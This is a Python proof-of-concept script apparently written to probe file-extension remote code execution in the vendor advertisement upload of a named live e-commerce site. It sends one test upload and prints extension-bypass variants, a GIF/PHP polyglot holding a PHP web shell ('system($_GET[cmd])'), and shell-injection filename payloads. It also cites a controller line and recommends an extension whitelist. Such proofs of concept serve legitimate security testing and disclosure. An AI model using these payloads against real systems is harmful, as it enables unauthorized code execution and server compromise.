
import requests
import sys
import io

TARGET = "https://new.snocart.com"
VENDOR_PATH = "/store-panel/advertisement/create"

# Create fake image (GIF header)
fake_image = b'GIF89a\x01\x00\x01\x00\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c'

def test_normal_upload():
    """Test normal image upload"""
    print("[*] Test 1: Normal image upload")
    
    files = {
        'cover_image': ('image.png', io.BytesIO(fake_image), 'image/png'),
    }
    data = {
        'advertisement_type': 'store_promotion',
        'dates': '07/01/2024 - 07/31/2024',
        'title[0]': 'Test Advertisement',
        'title[default]': 'Test Advertisement',
        'lang[0]': 'default',
        'description[0]': 'Test Description',
        'description[default]': 'Test Description',
    }
    
    try:
        r = requests.post(TARGET + VENDOR_PATH, files=files, data=data)
        print(f"[+] Status: {r.status_code}")
        print(f"[+] Response: {r.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")

def test_extension_manipulation():
    """Test with manipulated extension"""
    print("\n[*] Test 2: Extension manipulation attempt")
    
    # Simulate extension bypass
    test_extensions = [
        'php',           # Direct PHP
        'php5',          # PHP5 handler
        'phtml',         # PHTML executable
        'php.png',       # Double extension
        'png.php',       # Reverse double extension
        'php%20',        # With space
        'php%00.png',    # Null byte
        'php.',          # Trailing dot
        '.php',          # Leading dot
    ]
    
    for ext in test_extensions:
        print(f"[!] Testing extension: {ext}")
        print(f"    Resulting filename would be: 2024-07-04-abc123.{ext}")

def test_polyglot_file():
    """Test polyglot file (valid image + PHP code)"""
    print("\n[*] Test 3: Polyglot file creation")
    
    # GIF header + PHP code
    gif_header = bytes.fromhex('47494638396101000100000000FFFFFFFF21F904010000000000')
    php_code = b'<?php system($_GET["cmd"]); ?>'
    
    polyglot = gif_header + php_code
    
    print(f"[!] Polyglot file size: {len(polyglot)} bytes")
    print(f"[!] MIME type detection may show: image/gif")
    print(f"[!] But if interpreted as PHP: Remote Code Execution")
    
    # Check if magic bytes are correct
    magic = polyglot[:6]
    print(f"[!] File magic bytes: {magic.hex()}")
    print(f"[!] Expected for GIF: 474946383961")
    print(f"[!] Matches: {magic.hex() == '474946383961'}")

def demonstrate_shell_injection():
    """Demonstrate shell injection in filename"""
    print("\n[*] Test 4: Shell injection in filename")
    
    # This shows how special chars in extension could be injected
    injection_payloads = [
        'jpg" && id > /tmp/pwned && echo "',
        'jpg`whoami`',
        'jpg$(whoami)',
        'jpg\' && id && \'',
        'jpg; whoami #',
    ]
    
    for payload in injection_payloads:
        print(f"[!] Payload: {payload}")
        print(f"    Would create: 2024-07-04-abc123.{payload}")
        print(f"    If processed: Shell command execution possible")

def main():
    print("=" * 60)
    print("POC: Advertisement Controller File Extension RCE")
    print("=" * 60)
    
    test_normal_upload()
    test_extension_manipulation()
    test_polyglot_file()
    demonstrate_shell_injection()
    
    print("\n" + "=" * 60)
    print("SUMMARY:")
    print("=" * 60)
    print("[!] If above tests succeed, RCE vulnerability is confirmed")
    print("[!] Recommended fix: Whitelist allowed extensions")
    print("[!] Reference: /app/Http.4829/Controllers/Vendor/AdvertisementController.php:123")

if __name__ == "__main__":
    main()